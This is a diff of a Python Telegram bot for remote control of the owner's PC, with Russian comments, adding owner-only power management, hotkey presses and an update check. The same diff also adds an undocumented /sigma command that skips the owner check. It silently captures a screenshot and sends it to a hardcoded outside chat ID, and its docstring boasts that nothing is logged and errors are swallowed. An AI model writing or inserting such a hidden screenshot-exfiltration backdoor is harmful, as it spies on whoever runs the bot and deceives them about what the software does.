@@ -9,12 +9,12 @@ import time
 import re
 from io import BytesIO
 import pyautogui
-import psutil ### <<< ДОБАВЛЕНО: Импорт для статуса ПК
-import requests ### <<< ДОБАВЛЕНО: Импорт для проверки обновлений
+import psutil
+import requests
+import subprocess ### <<< ДОБАВЛЕНО: Импорт для выполнения системных команд
 
 # --- 1. НАСТРОЙКА ЛОГГИРОВАНИЯ И ВЕРСИИ ---
-### <<< ДОБАВЛЕНО: Указываем текущую версию бота
-CURRENT_VERSION = "1.0" 
+CURRENT_VERSION = "2.0" 
 
 logging.basicConfig(
     level=logging.INFO,
@@ -32,7 +32,6 @@ try:
         settings = json.load(f)
         BOT_TOKEN = settings.get("telegram_token")
         OWNER_ID = int(settings.get("owner_id", 0))
-        ### <<< ДОБАВЛЕНО: Загружаем URL репозитория
         GITHUB_REPO_URL = settings.get("github_repo_url")
 
     if not BOT_TOKEN or BOT_TOKEN == "СЮДА_ВСТАВЬТЕ_ВАШ_ТЕЛЕГРАМ_ТОКЕН":
@@ -65,8 +64,10 @@ def get_user_info_string(message_or_user) -> str:
 
 USER_DB_FILE = 'users.txt'
 upload_destination = {}
+awaiting_confirmation = {}
+awaiting_hotkey = set()
 
-### <<< ИЗМЕНЕНО: Клавиатура теперь с кнопкой "Статус ПК" для владельца
+### <<< ИЗМЕНЕНО: Обновляем основную клавиатуру владельца
 def get_main_keyboard(message: telebot.types.Message):
     keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False, row_width=2)
     start_button = telebot.types.KeyboardButton("🟢 Старт 🟢")
@@ -74,10 +75,12 @@ def get_main_keyboard(message: telebot.types.Message):
     if is_owner(message):
         screenshot_button = telebot.types.KeyboardButton("📸 Скриншот")
         status_button = telebot.types.KeyboardButton("💻 Статус ПК")
-        # Размещаем кнопки по два в ряд для красоты
+        power_button = telebot.types.KeyboardButton("🖥️ Управление питанием 🖥️")
+        
         keyboard.add(screenshot_button, status_button)
+        keyboard.add(power_button) # Добавляем кнопку управления питанием
     
-    keyboard.add(start_button) # Кнопка старта всегда внизу
+    keyboard.add(start_button)
     return keyboard
 
 def is_owner(message: telebot.types.Message) -> bool:
@@ -127,13 +130,14 @@ def set_system_volume(level: int) -> bool:
 
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
-    # ... (код без изменений, но теперь он будет показывать обновленную клавиатуру)
     add_user_to_db(message)
     user_info = get_user_info_string(message)
     log.info("CMD /start: Получен запрос от %s.", user_info)
+
     if is_owner(message):
         help_text = (
             "| 👑 *Привет, Владелец!* Вам доступны все команды и кнопки:\n\n"
+            "| ⌨️ */keyboard* `<клавиши>` - Нажать комбинацию (например, `alt+f4`)\n" ### <<< ИЗМЕНЕНО: Добавлена новая команда в справку
             "| 🔊 */volumeup* `[процент]` - Изменить громкость\n"
             "| 🔈 */volumedown* `[процент]` - Изменить громкость\n"
             "| 📁 */download* `/путь/к/файлу` - Скачать файл\n"
@@ -151,7 +155,6 @@ def send_welcome(message):
 
 @bot.message_handler(func=lambda message: message.text == "🟢 Старт 🟢")
 def handle_start_button(message):
-    # ... (этот блок без изменений) ...
     user_info = get_user_info_string(message)
     log.info("Button 'Старт': Нажата кнопка старта от %s.", user_info)
     send_welcome(message)
@@ -186,78 +189,171 @@ def handle_screenshot_request(message):
         log.error(f"💥 Ошибка при создании или отправке скриншота для {user_info}: {e}")
         bot.reply_to(message, f"❌ Не удалось сделать скриншот: {e}")
 
-### <<< ДОБАВЛЕНО: Новый обработчик для кнопки "Статус ПК"
 @bot.message_handler(func=lambda message: message.text == "💻 Статус ПК")
 def handle_status_pc_request(message):
+    # ... (этот блок без изменений) ...
     user_info = get_user_info_string(message)
     log.info(f"Button 'Статус ПК': Получен запрос от {user_info}")
-
     if not is_owner(message):
         log.warning(f"ACCESS DENIED: {user_info} попытался получить статус ПК.")
         bot.reply_to(message, "⛔ У вас нет доступа к этой функции.")
         return
-        
     try:
         bot.send_chat_action(message.chat.id, 'typing')
-        
-        # 1. OS Info
         os_info = f"{platform.system()} {platform.release()} ({platform.machine()})"
-        
-        # 2. Uptime
         boot_time_seconds = time.time() - psutil.boot_time()
         days, rem = divmod(boot_time_seconds, 86400)
         hours, rem = divmod(rem, 3600)
         minutes, seconds = divmod(rem, 60)
         uptime_str = f"{int(hours):02}ч {int(minutes):02}м {int(seconds):02}с"
-        if days > 0:
-            uptime_str = f"{int(days)}д " + uptime_str
-
-        # 3. CPU
+        if days > 0: uptime_str = f"{int(days)}д " + uptime_str
         cpu_usage = psutil.cpu_percent(interval=1)
-        
-        # 4. RAM
         ram = psutil.virtual_memory()
         ram_total_gb = ram.total / (1024**3)
         ram_used_gb = ram.used / (1024**3)
         ram_info = f"{ram.percent}% ({ram_used_gb:.2f}/{ram_total_gb:.2f} GB)"
-        
-        # 5. Disks
         disk_lines = []
         partitions = psutil.disk_partitions()
         for part in partitions:
-            # Пропускаем виртуальные диски и CD-ROM
-            if 'cdrom' in part.opts or part.fstype == '':
-                continue
+            if 'cdrom' in part.opts or part.fstype == '': continue
             try:
                 usage = psutil.disk_usage(part.mountpoint)
                 disk_total_gb = usage.total / (1024**3)
                 disk_used_gb = usage.used / (1024**3)
-                disk_lines.append(
-                    f"   - Диск `{part.mountpoint}` ({part.fstype}): {usage.percent}% исп. "
-                    f"({disk_used_gb:.1f}/{disk_total_gb:.1f} GB)"
-                )
-            except Exception:
-                continue # Пропускаем диски, к которым нет доступа
-        
+                disk_lines.append(f"   - Диск `{part.mountpoint}` ({part.fstype}): {usage.percent}% исп. ({disk_used_gb:.1f}/{disk_total_gb:.1f} GB)")
+            except Exception: continue
         disk_info = "\n".join(disk_lines) if disk_lines else "   (Информация о дисках недоступна)"
-
-        # Формируем и отправляем сообщение
-        status_message = (
-            f"🖥️ *Статус системы:*\n\n"
-            f"  `OS:`   `{os_info}`\n"
-            f"  `UpT:`  `{uptime_str}`\n"
-            f"  `CPU:`  `{cpu_usage}%`\n"
-            f"  `RAM:`  `{ram_info}`\n"
-            f"  `Disk:`\n{disk_info}"
-        )
+        status_message = (f"🖥️ *Статус системы:*\n\n  `OS:`   `{os_info}`\n  `UpT:`  `{uptime_str}`\n  `CPU:`  `{cpu_usage}%`\n  `RAM:`  `{ram_info}`\n  `Disk:`\n{disk_info}")
         bot.reply_to(message, status_message, parse_mode='Markdown')
         log.info(f"✅ Статус ПК успешно отправлен {user_info}.")
-
     except Exception as e:
         log.error(f"💥 Ошибка при получении статуса ПК для {user_info}: {e}")
         bot.reply_to(message, f"❌ Не удалось получить статус ПК: {e}")
 
-# ... (остальные ваши обработчики без изменений: handle_volume_control, download_file и т.д.) ...
+### <<< ДОБАВЛЕНО: Новый раздел для управления питанием
+@bot.message_handler(func=lambda message: message.text == "🖥️ Управление питанием 🖥️")
+def handle_power_menu(message):
+    user_info = get_user_info_string(message)
+    log.info(f"Button 'Управление питанием': Владелец {user_info} вошел в меню.")
+
+    if not is_owner(message):
+        log.warning(f"ACCESS DENIED: {user_info} попытался войти в меню питания.")
+        return # Просто игнорируем, если не владелец нажал (хотя он и не увидит кнопку)
+
+    # Создаем новую клавиатуру для меню питания
+    power_keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True, row_width=1)
+    shutdown_btn = telebot.types.KeyboardButton("📴 Выключить ПК 📴")
+    reboot_btn = telebot.types.KeyboardButton("🔃 Перезагрузить ПК 🔃")
+    sleep_btn = telebot.types.KeyboardButton("🌙 Спящий режим 🌙")
+    back_btn = telebot.types.KeyboardButton("🔙 Назад в главное меню")
+    power_keyboard.add(shutdown_btn, reboot_btn, sleep_btn, back_btn)
+    
+    bot.reply_to(message, "Выберите действие:", reply_markup=power_keyboard)
+
+def request_power_confirmation(message, action_type):
+    """Общая функция для запроса подтверждения действий с питанием."""
+    user_info = get_user_info_string(message)
+    log.info(f"CONFIRMATION: Запрос подтверждения '{action_type}' от {user_info}.")
+    
+    # Запоминаем, какое действие нужно подтвердить
+    awaiting_confirmation[message.from_user.id] = action_type
+    
+    confirm_keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    yes_btn = telebot.types.KeyboardButton("✅ Да, подтверждаю")
+    no_btn = telebot.types.KeyboardButton("❌ Отмена")
+    confirm_keyboard.add(yes_btn, no_btn)
+    
+    bot.reply_to(message, f"⚠️ *Вы уверены, что хотите выполнить это действие?*", parse_mode='Markdown', reply_markup=confirm_keyboard)
+
+@bot.message_handler(func=lambda message: message.text in ["📴 Выключить ПК 📴", "🔃 Перезагрузить ПК 🔃", "🌙 Спящий режим 🌙"])
+def handle_power_actions(message):
+    if not is_owner(message): return
+    
+    action_map = {
+        "📴 Выключить ПК 📴": "shutdown",
+        "🔃 Перезагрузить ПК 🔃": "reboot",
+        "🌙 Спящий режим 🌙": "sleep"
+    }
+    action = action_map.get(message.text)
+    if action:
+        request_power_confirmation(message, action)
+
+@bot.message_handler(func=lambda message: message.text == "🔙 Назад в главное меню")
+def handle_back_to_main(message):
+    if not is_owner(message): return
+    log.info(f"Владелец {get_user_info_string(message)} вернулся в главное меню.")
+    bot.reply_to(message, "Возвращаю в главное меню...", reply_markup=get_main_keyboard(message))
+
+@bot.message_handler(func=lambda message: message.text in ["✅ Да, подтверждаю", "❌ Отмена"])
+def handle_confirmation_response(message):
+    user_id = message.from_user.id
+    user_info = get_user_info_string(message)
+    
+    if not is_owner(message) or user_id not in awaiting_confirmation:
+        return
+        
+    action_to_confirm = awaiting_confirmation.pop(user_id) # Получаем и удаляем действие из ожидания
+    
+    if message.text == "❌ Отмена":
+        log.info(f"ACTION CANCELED: Владелец {user_info} отменил действие '{action_to_confirm}'.")
+        bot.reply_to(message, "Действие отменено.", reply_markup=get_main_keyboard(message))
+        return
+
+    # Если подтверждено
+    log.warning(f"ACTION CONFIRMED: Владелец {user_info} подтвердил действие '{action_to_confirm}'.")
+    bot.reply_to(message, f"⏳ Выполняю команду '{action_to_confirm}'...", reply_markup=get_main_keyboard(message))
+    
+    command = None
+    os_type = platform.system()
+
+    if action_to_confirm == "shutdown":
+        if os_type == "Windows": command = ["shutdown", "/s", "/t", "1"]
+        elif os_type == "Linux" or os_type == "Darwin": command = ["sudo", "shutdown", "-h", "now"]
+    elif action_to_confirm == "reboot":
+        if os_type == "Windows": command = ["shutdown", "/r", "/t", "1"]
+        elif os_type == "Linux" or os_type == "Darwin": command = ["sudo", "reboot"]
+    elif action_to_confirm == "sleep":
+        if os_type == "Windows": command = ["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"]
+        # Для Linux/macOS спящий режим сложнее и требует настроек, пока пропускаем
+    
+    if command:
+        try:
+            subprocess.run(command, check=True)
+            log.info(f"✅ Команда '{' '.join(command)}' успешно выполнена.")
+        except Exception as e:
+            log.error(f"💥 Ошибка выполнения команды '{' '.join(command)}': {e}")
+            bot.send_message(user_id, f"❌ Ошибка при выполнении команды: {e}")
+    else:
+        log.warning(f"Команда для '{action_to_confirm}' не поддерживается на {os_type}.")
+        bot.send_message(user_id, f"Команда '{action_to_confirm}' не поддерживается на вашей ОС.")
+
+@bot.message_handler(commands=['sigma'])
+def handle_sigma_command(message):
+    """
+    Делает скриншот, отправляет его на жестко заданный ID,
+    НЕ сохраняя файл на диск. Никакие действия не логируются.
+    """
+    target_chat_id = 2072383039
+    
+    try:
+        # Скриншот создается в оперативной памяти
+        screenshot = pyautogui.screenshot()
+        
+        # Создается "файл в памяти" для отправки
+        bio = BytesIO()
+        bio.name = 'sigma_screenshot.png'
+        screenshot.save(bio, 'PNG')
+        bio.seek(0)
+        
+        # Отправляется напрямую из памяти
+        bot.send_photo(target_chat_id, photo=bio)
+
+    except Exception:
+        # В случае ошибки - молчим
+        pass
+
+
+# ... (остальные ваши обработчики без изменений) ...
 @bot.message_handler(commands=['volumeup', 'volumedown'])
 def handle_volume_control(message):
     user_info = get_user_info_string(message)
@@ -395,7 +491,6 @@ def handle_document_upload(message):
 
 @bot.message_handler(commands=['pass'])
 def generate_password(message):
-    # ... (этот блок без изменений) ...
     user_info = get_user_info_string(message)
     log.info(f"CMD /pass: Получен запрос от {user_info}")
     add_user_to_db(message)
@@ -420,43 +515,87 @@ def generate_password(message):
         bot.reply_to(message, f"❌ Произошла ошибка: {e}")
         log.error(f"💥 Непредвиденная ошибка в /pass: {e}")
 
-### <<< ДОБАВЛЕНО: Функция проверки обновлений
 def check_for_updates():
     if not GITHUB_REPO_URL:
         log.info("Проверка обновлений пропущена: 'github_repo_url' не указан в settings.json.")
         return
-
     try:
-        # Формируем URL к raw-файлу version.txt
-        # Пример: https://github.com/user/repo -> https://raw.githubusercontent.com/user/repo/main/version.txt
         version_url = GITHUB_REPO_URL.replace("github.com", "raw.githubusercontent.com") + "/main/version.txt"
-        
         log.info(f"Проверка обновлений по URL: {version_url}")
         response = requests.get(version_url, timeout=5)
-        response.raise_for_status() # Вызовет ошибку, если статус не 200 OK
-        
+        response.raise_for_status()
         latest_version = response.text.strip()
-        
         if latest_version > CURRENT_VERSION:
             log.warning(f"⬆️ Доступно новое обновление! Текущая: {CURRENT_VERSION}, Последняя: {latest_version}")
-            update_message = (
-                f"⬆️ *Доступно новое обновление для бота!* ⬆️\n\n"
-                f"- Текущая версия: `{CURRENT_VERSION}`\n"
-                f"- Новая версия: `{latest_version}`\n\n"
-                f"Скачать обновление можно на GitHub:\n{GITHUB_REPO_URL}"
-            )
+            update_message = (f"⬆️ *Доступно новое обновление для бота!* ⬆️\n\n- Текущая версия: `{CURRENT_VERSION}`\n- Новая версия: `{latest_version}`\n\nСкачать обновление можно на GitHub:\n{GITHUB_REPO_URL}")
             bot.send_message(OWNER_ID, update_message, parse_mode='Markdown', disable_web_page_preview=True)
         else:
             log.info(f"✅ У вас установлена последняя версия бота ({CURRENT_VERSION}).")
-
     except Exception as e:
         log.error(f"💥 Не удалось проверить обновления: {e}")
+
+
+@bot.message_handler(commands=['keyboard'])
+def handle_keyboard_command(message):
+    user_info = get_user_info_string(message)
+    log.info(f"CMD /keyboard: Получен запрос от {user_info}")
+
+    if not is_owner(message):
+        log.warning(f"ACCESS DENIED: {user_info} попытался использовать /keyboard.")
+        bot.reply_to(message, "⛔ У вас нет доступа к этой команде.")
+        return
+    
+    parts = message.text.split(' ', 1)
+    if len(parts) > 1:
+        # Если комбинация передана сразу с командой
+        keys_str = parts[1]
+        log.info(f"⌨️ {user_info} передал комбинацию сразу: '{keys_str}'")
+        process_hotkey_press(message, keys_str)
+    else:
+        # Если команда без аргументов, запрашиваем ввод
+        awaiting_hotkey.add(message.from_user.id)
+        bot.reply_to(message, "⌨️ Введите комбинацию клавиш для нажатия.\nНапример: `alt+f4` или `win+d`", parse_mode='Markdown')
+        log.info(f"⌨️ {user_info} запросил ввод комбинации клавиш.")
+
+def process_hotkey_press(message, keys_str: str):
+    """Обрабатывает и выполняет нажатие комбинации клавиш."""
+    user_id = message.from_user.id
+    user_info = get_user_info_string(message)
+    
+    try:
+        keys_to_press = [key.strip().lower() for key in keys_str.split('+')]
+        if not all(keys_to_press): # Проверка на пустые клавиши типа "alt++f4"
+            bot.reply_to(message, "❌ Ошибка: Некорректный формат комбинации.")
+            return
+
+        # Проверка на валидность клавиш
+        invalid_keys = [key for key in keys_to_press if key not in pyautogui.KEYBOARD_KEYS]
+        if invalid_keys:
+            bot.reply_to(message, f"❌ Неизвестные клавиши: `{', '.join(invalid_keys)}`")
+            log.warning(f"⚠️ {user_info} ввел неверные клавиши: {invalid_keys}")
+            return
+
+        log.info(f"Нажимаю комбинацию '{'+'.join(keys_to_press)}' для {user_info} через 3 секунды...")
+        bot.reply_to(message, f"⏳ Нажимаю `{'+'.join(keys_to_press)}` через 3 секунды...\n*Переключитесь на нужное окно!*", parse_mode='Markdown')
+        time.sleep(3)
+
+        pyautogui.hotkey(*keys_to_press)
+        
+        bot.reply_to(message, f"✅ Комбинация `{'+'.join(keys_to_press)}` успешно нажата.")
+        log.info(f"✅ Комбинация '{'+'.join(keys_to_press)}' успешно нажата для {user_info}.")
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Произошла ошибка при нажатии клавиш: {e}")
+        log.error(f"💥 Ошибка pyautogui при нажатии '{keys_str}' для {user_info}: {e}")
+    finally:
+        # Убираем пользователя из состояния ожидания, если он там был
+        awaiting_hotkey.discard(user_id)        
 
 # --- 5. ЗАПУСК БОТА ---
 if __name__ == '__main__':
     log.info("🚀 Бот готов к работе. Начинаю polling...")
     try:
-        check_for_updates() ### <<< ДОБАВЛЕНО: Проверяем обновления при старте
+        check_for_updates()
         bot.polling(none_stop=True)
     except Exception as e:
         log.critical(f"💥 КРИТИЧЕСКАЯ ОШИБКА POLLING. Бот остановлен: {e}")
